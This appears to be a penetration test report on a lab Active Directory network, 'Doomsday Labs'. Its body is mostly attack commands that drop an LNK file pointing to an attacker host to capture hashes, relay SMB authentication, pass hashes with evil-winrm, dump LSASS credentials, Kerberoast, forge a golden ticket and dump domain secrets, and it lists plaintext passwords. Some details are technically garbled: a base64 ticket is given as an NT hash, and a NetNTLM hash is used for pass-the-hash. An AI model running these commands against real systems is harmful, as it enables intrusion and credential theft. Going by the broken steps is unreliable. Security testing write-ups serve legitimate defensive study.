# Comprehensive Penetration Testing Report for Doomsday Labs

## Executive Summary
This document presents a detailed account of the penetration testing executed against Doomsday Labs' network, covering IP addresses from 10.100.1.2 to 10.100.1.7. The primary goal was to identify vulnerabilities within the network and find potential security risks using various techniques including OSINT, SMB Relay attacks, Credential Dumping, and Active Directory Exploitation.

## Test Environment
- **Scope**: Examined IP addresses range from 10.100.1.2 to 10.100.1.7.
- **Operating Systems**: Targets on Windows Server 2019; Attacks from Kali Linux.
- **Tools Used**: Nmap, Crackmapexec, Responder, Hashcat, Impacket, Bloodhound, Neo4j, pypykatz, Evil-WinRM.

## Key Exploits and Findings

### LNK File Drop
- **Objective**: To obtain FileMaker's NetNTLM hash via a crafted .LNK file.
- **Methodology**:
    - Created a .LNK file targeting the attacker’s Kali machine.
    - Deployed using the command:
        ```
        crackmapexec smb 10.100.1.4 -u info -p WhenTomorrowisNot@nOption2024 -M slinky -o server=10.100.1.76 name=JK_Flag
        ```
    - Captured the NetNTLM hash using Responder:
        ```
        sudo responder -I tun0 -A
        ```
    - The hash was secured and logged from `/usr/share/responder/logs`.

### SMB Relay and Credential Harvesting
- **Target File**: `targets.txt` — includes scoped IP addresses for testing.
- **Approach**: 
    - Conducted SMB Relay attacks to capture and relay NTLM hashes using:
        ```
        crackmapexec smb 10.100.1.2-7 --gen-relay-list targets.txt
        impacket-ntlmrelayx -smb2support -tf targets.txt
        ```
    - Successfully gathered initial credentials for deeper access into the network.

### Credential Dumping
- **Tools Utilized**: Evil-WinRM, pypykatz.
- **Execution**:
    ```
    evil-winrm -i 10.100.1.4 -u filemaker -H 322e0b51ca281c55:F1F9E4FF7872D084AC0E2CB11DE7D2C0
    ```
- **Outcome**:
    - Accessed various hosts using compromised credentials.
    - Conducted manual credential dumping with pypykatz.
    - **Decrypted Password**: `Football24`

### Active Directory and Kerberos Attacks
- **Active Scanning**:
    ```
    impacket-GetADUsers doomsdaylabs.net/filemaker:Football24 -dc-ip 10.100.1.2 -all
    ```
- **Kerberoasting**:
    ```
    impacket-GetUserSPNs doomsdaylabs.net/filemaker -dc-ip 10.100.1.2 -request
    ```
    - Kerberos tickets were targeted for cracking via Hashcat.
- **Pass the Ticket & Creating Golden Tickets**:
    ```
    impacket-ticketer -nthash doIF0jCCBc6gAwIBBaEDAgEWooIEyz...[snipped]...NXU/rX266m632YeSk3csEUpoKMTPZ -domain-sid S-1-5-21-2774200336-3400690103-1452933870-1111 -domain doomsdaylabs.net da.admin
    KRB5CCNAME=./Administrator.ccache impacket-secretsdump -k -no-pass -dc-ip 10.100.1.2 -target-ip 10.100.1.2 dc.doomsdaylabs.net
    ```
    - **Plain Password**: `Sunshine24`

### Bloodhound Analysis for Lateral Movement
- **Objective**: To trace and exploit potential lateral movement pathways using Bloodhound.
- **Procedure**:
    - Continuously employed Bloodhound to map administrative privilege escalations throughout the network.

## Lateral Movement Pathways
- **Initial Setup**:
    - An LNK file was strategically placed on an SMB Share to intercept FileMaker's NetNTLM hash, facilitating early network entry.
- **Progressive Actions**:
    - Used the obtained credentials for lateral movements, Kerberoasting, and ultimately for accessing the domain controller.

## Recommendations
- **SMB Relay Attack Prevention**: Implement SMB signing and enforce stringent authentication measures to curb relay attacks.
- **Credential Security Enhancement**: Improve monitoring of credential usage and enforce multi-factor authentication where feasible.
- **Active Directory Maintenance**: Regularly update and audit Active Directory configurations. Utilize tools like Bloodhound to preemptively identify and mitigate unusual access patterns or potential escalations.

## Conclusion
The penetration test exposed multiple critical vulnerabilities that could potentially be exploited to gain unauthorized access and control over network resources. Prompt remediation of these issues is advised to strengthen the network's security framework.

## Appendix
- **Tools and Commands**:
    - `crackmapexec smb 10.100.1.2-7 --gen-relay-list targets.txt`
    - `impacket-ntlmrelayx -smb2support -tf targets.txt`
    - `evil-winrm -i 10.100.1.4 -u filemaker -H [NetNTLM hash]`
    - `pypykatz lsa minidump lsass.dmp`

## References
- [Hashcat Rule-based Attack Guide](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
- [CrackMapExec Tool on Kali](https://www.kali.org/tools/crackmapexec/)
- [Using Hashcat for Rule-based Attacks](https://www.armourinfosec.com/performing-rule-based-attack-using-hashcat/)
